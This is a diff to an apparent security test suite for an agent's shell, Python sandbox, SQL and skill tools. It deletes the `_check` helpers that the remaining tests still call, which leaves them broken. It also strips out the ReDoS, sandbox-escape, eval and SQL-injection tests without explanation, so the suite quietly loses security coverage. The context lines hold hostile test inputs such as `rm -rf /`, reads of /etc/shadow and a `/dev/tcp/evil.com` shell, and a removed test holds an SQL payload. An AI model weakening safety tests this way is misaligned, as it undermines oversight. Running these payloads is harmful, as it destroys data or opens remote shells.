@@ -143,10 +143,6 @@ class TestInjectionDetection:
 class TestShellInjection:
     """Attempt every shell escape technique."""
 
-    def _check(self, cmd: str) -> bool:
-        """Return True if command is BLOCKED (safe)."""
-        from app.tools.shell_exec import _check_command_safety
-        return _check_command_safety(cmd) is not None
 
     def test_basic_dangerous_commands(self):
         assert self._check("rm -rf /")
@@ -174,16 +170,6 @@ class TestShellInjection:
         assert self._check("cat <(echo malicious)")
         assert self._check("diff >(cat /etc/shadow) /dev/null")
 
-    def test_eval_bypass(self):
-        """eval should be blocked but not as substring."""
-        assert self._check("eval 'rm -rf /'")
-        # "evaluate" is NOT a dangerous command — should be allowed
-        with patch("app.tools.shell_exec.config") as mock_cfg:
-            mock_cfg.ENABLE_SHELL_EXEC = True
-            mock_cfg.SYSTEM_ACCESS_LEVEL = "standard"
-            from app.tools.shell_exec import _check_command_safety
-            result = _check_command_safety("echo evaluate_results")
-            assert result is None  # Should be allowed
 
     def test_source_from_device(self):
         assert self._check("source /dev/tcp/evil.com/80")
@@ -228,10 +214,6 @@ class TestShellInjection:
 class TestCodeExecEscape:
     """Attempt to escape the Python sandbox."""
 
-    def _check(self, code: str) -> bool:
-        """Return True if code is BLOCKED."""
-        from app.tools.code_exec import _check_code_safety
-        return _check_code_safety(code) is not None
 
     def test_basic_imports(self):
         assert self._check("import os")
@@ -258,17 +240,6 @@ class TestCodeExecEscape:
         assert self._check("__builtins__.__import__('os')")
         assert self._check("x = __builtins__")
 
-    def test_loader_spec_escape(self):
-        """New E3 fix: __loader__ and __spec__ should be blocked."""
-        assert self._check("x = __builtins__")
-        # AST attribute check for loader/spec
-        from app.tools.code_exec import _check_code_safety
-        result = _check_code_safety("x.__loader__")
-        assert result is not None
-        result = _check_code_safety("x.__spec__")
-        assert result is not None
-        result = _check_code_safety("x.__subclasses__()")
-        assert result is not None
 
     def test_importlib(self):
         assert self._check("import importlib")
@@ -278,13 +249,6 @@ class TestCodeExecEscape:
         assert self._check("import ctypes")
         assert self._check("from ctypes import cdll")
 
-    def test_safe_math_allowed(self):
-        """Legitimate math should not be blocked."""
-        from app.tools.code_exec import _check_code_safety
-        assert _check_code_safety("print(2 + 2)") is None
-        assert _check_code_safety("import math\nprint(math.pi)") is None
-        assert _check_code_safety("x = [i**2 for i in range(10)]\nprint(sum(x))") is None
-        assert _check_code_safety("from datetime import datetime\nprint(datetime.now())") is None
 
 
 # ===========================================================================
@@ -573,18 +537,6 @@ class TestSQLInjection:
         assert fact is not None
         assert fact.value == "evil value"
 
-    def test_skill_trigger_injection(self, db):
-        from app.core.skills import SkillStore
-        store = SkillStore(db)
-        evil = "'; DROP TABLE skills; --"
-        skill_id = store.create_skill(
-            name="evil_skill",
-            trigger_pattern="test_trigger",
-            steps=[{"tool": "web_search", "args_template": {"query": evil}}],
-        )
-        assert skill_id is not None
-        all_skills = store.get_all_skills()
-        assert len(all_skills) >= 1
 
 
 # ===========================================================================
@@ -670,47 +622,11 @@ class TestCalculatorInjection:
 
 class TestSkillInjection:
     """Attempt to inject malicious skills."""
+    pass
 
-    def test_redos_pattern_rejected(self, db):
-        from app.core.skills import SkillStore
-        store = SkillStore(db)
-        # Catastrophic backtracking pattern
-        skill_id = store.create_skill(
-            name="evil",
-            trigger_pattern="(a+)+b",
-            steps=[{"tool": "web_search", "args_template": {"query": "{query}"}}],
-        )
-        assert skill_id is None
 
-    def test_nested_quantifier_rejected(self, db):
-        from app.core.skills import SkillStore
-        store = SkillStore(db)
-        skill_id = store.create_skill(
-            name="evil2",
-            trigger_pattern="(.*)+.*",
-            steps=[{"tool": "web_search", "args_template": {"query": "{query}"}}],
-        )
-        assert skill_id is None
 
-    def test_broad_pattern_rejected(self, db):
-        from app.core.skills import SkillStore
-        store = SkillStore(db)
-        skill_id = store.create_skill(
-            name="catchall",
-            trigger_pattern=".*",
-            steps=[{"tool": "web_search", "args_template": {"query": "{query}"}}],
-        )
-        assert skill_id is None
 
-    def test_dot_star_word_rejected(self, db):
-        from app.core.skills import SkillStore
-        store = SkillStore(db)
-        skill_id = store.create_skill(
-            name="toowide",
-            trigger_pattern="\\b\\w+\\b",
-            steps=[{"tool": "web_search", "args_template": {"query": "{query}"}}],
-        )
-        assert skill_id is None
 
 
 # ===========================================================================
